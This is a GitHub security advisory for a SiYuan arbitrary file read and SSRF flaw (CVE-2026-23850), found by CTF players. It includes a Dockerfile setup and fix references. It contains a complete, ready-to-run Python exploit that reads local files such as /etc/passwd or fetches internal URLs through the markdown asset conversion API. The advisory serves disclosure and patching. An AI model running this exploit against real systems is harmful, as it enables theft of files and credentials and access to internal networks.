# [H] SiYuan vulnerable to Arbitrary file Read / SSRF

## Summary
Severity: High
Advisory: GHSA-cv54-7wv7-qxcw
CVE: CVE-2026-23850
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-01-21
Source: https://github.com/advisories/GHSA-cv54-7wv7-qxcw
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260118092326-b2274baba2e1

## Details
### Summary
Markdown feature allows unrestricted server side html-rendering which allows arbitary file read (LFD) and fully SSRF access
We in @0xL4ugh ( @abdoghazy2015, @xtromera, @A-z4ki, @ZeyadZonkorany and @KarimTantawey) During playing Null CTF 2025 that helps us solved a challenge with unintended way :  )

Please note that we used the latest Version and deployed it via this dockerfile : 

Dockerfile:
```
FROM b3log/siyuan

ENV TZ=America/New_York \
    PUID=1000 \
    PGID=1000 \
    SIYUAN_ACCESS_AUTH_CODE=SuperSecretPassword
    
RUN mkdir -p /siyuan/workspace

COPY ./startup.sh /opt/siyuan/startup.sh
RUN chmod +x /opt/siyuan/startup.sh

EXPOSE 6806

ENTRYPOINT ["sh", "-c", "/opt/siyuan/startup.sh"]
```

startup.sh
```sh
#!/bin/sh
set -e
echo "nullctf{secret}" > "/flag_random.txt"
exec ./entrypoint.sh

```
docker-compose.yaml:

```yaml
services:
  main:
    build: .
    ports:
      - 6806:6806
    restart: unless-stopped
    environment:
      - TZ=America/New_York
      - PUID=1000
      - PGID=1000
    container_name: archivists_whisper
```
### Details
As you can see here : https://github.com/siyuan-note/siyuan/blob/v3.4.2/kernel/api/filetree.go#L799-L886
in `createDocWithMd` function
the `markdown` parameter is being passed to the model.CreateWithMarkdown without any sanitization 
while here : https://github.com/siyuan-note/siyuan/blob/master/kernel/model/file.go#L1035 the input is being passed to `luteEngine.Md2BlockDOM(md, false)`  without any sanitization too

### PoC
Here is a full Python POC ready to run 
```py
import requests, sys, os

if len(sys.argv) >= 5 :
    TARGET = sys.argv[1].rstrip("/")
    PASSWORD = sys.argv[2]
    attack_type = sys.argv[3]
    if attack_type == "LFD":
        file_path = f"file://{sys.argv[4]}"
    elif attack_type == "SSRF":
        file_path = f"{sys.argv[4]}"
else:
    sys.exit(f"Usage : python3 {sys.argv[0]} http://target password LFD/SSRF filepath/link")
    TARGET = "http://127.0.0.1:6806"
    PASSWORD = "SuperSecretPassword" # Workgroup password
    file_path = "/etc/passwd" # file to read

s  = requests.Session()

def login():
    s.post(f"{TARGET}/api/system/loginAuth", json={"authCode": PASSWORD, "rememberMe": True})


def list_notebooks():
    res = s.post(f"{TARGET}/api/notebook/lsNotebooks").json()
    notebooks = res["data"]["notebooks"]
    if not notebooks:
        raise RuntimeError("No notebooks found – create one in the UI first")
    notebook = notebooks[0]["id"]
    return notebook

def file_to_md(notebook, file_path):
    doc_id = s.post(
    f"{TARGET}/api/filetree/createDocWithMd",
    json={
        "notebook": notebook,
        "path": "/pwn",
        "markdown": f"[loot]({file_path})"
    },
    ).json()["data"]
    return doc_id

def convert_file_to_asset(doc_id):
    res = s.post(f"{TARGET}/api/format/netAssets2LocalAssets", json={"id": doc_id})
    # print(f"Debug : convert", res.text)

def get_new_file_name_from_assets(file_path):
    res = s.post(f"{TARGET}/api/file/readDir", json={"path": "/data/assets"}).json()["data"]
    if attack_type == "LFD":
        new_file_name = f"network-asset-{os.path.splitext(os.path.basename(file_path))[0]}-"
    else:
        new_file_name = f"network-asset-{os.path.basename(file_path)}-"
    # print(new_file_name)
    for file in res:
        # print(file["name"])
        if new_file_name in file["name"]:
            return file["name"]
            

def retrieve_file_content(file_name):
    return s.get(f"{TARGET}/assets/{file_name}").text


login()
notebook = list_notebooks()
doc_id = file_to_md(notebook, file_path)
# print(f"Debug : Docid", doc_id)
convert_file_to_asset(doc_id)
file_name = get_new_file_name_from_assets(file_path)
file_content = retrieve_file_content(file_name)
if len(file_content) > 0 :
    print("Content : ", file_content)
else:
    print(f"Failed to get {file_name} try to get it manually, probably we failed to predict the new file name")
```

### File read
<img width="928" height="333" alt="image" src="https://github.com/user-attachments/assets/8b6c81b9-106d-4d41-beaf-29ee3f6413cb" />
<img width="800" height="143" alt="image" src="https://github.com/user-attachments/assets/87a6fab8-d1a7-4690-b157-4c6250b67b8a" />

### SSRF : 
We spawned a python server at /tmp  : 4444 and requested it the result is we could successfuly read a file from http://127.0.0.1/ghazy

<img width="822" height="63" alt="image" src="https://github.com/user-attachments/assets/9842aad2-1ade-45c0-9db1-fc049cf6b4cf" />


### Impact
As shown above, we could sucessfully read any file in the system and reach any internal host via SSRF : )

### Solution

https://github.com/siyuan-note/siyuan/issues/16860

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-cv54-7wv7-qxcw
- https://nvd.nist.gov/vuln/detail/CVE-2026-23850
- https://github.com/siyuan-note/siyuan/issues/16860
- https://github.com/siyuan-note/siyuan/commit/b2274baba2e11c8cf8901b0c5c871e5b27f1f6dd
- https://github.com/siyuan-note/siyuan/commit/f8f4b517077b92c90c0d7b51ac11be1b34b273ad
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/blob/master/kernel/model/file.go#L1035
- https://github.com/siyuan-note/siyuan/blob/v3.4.2/kernel/api/filetree.go#L799-L886
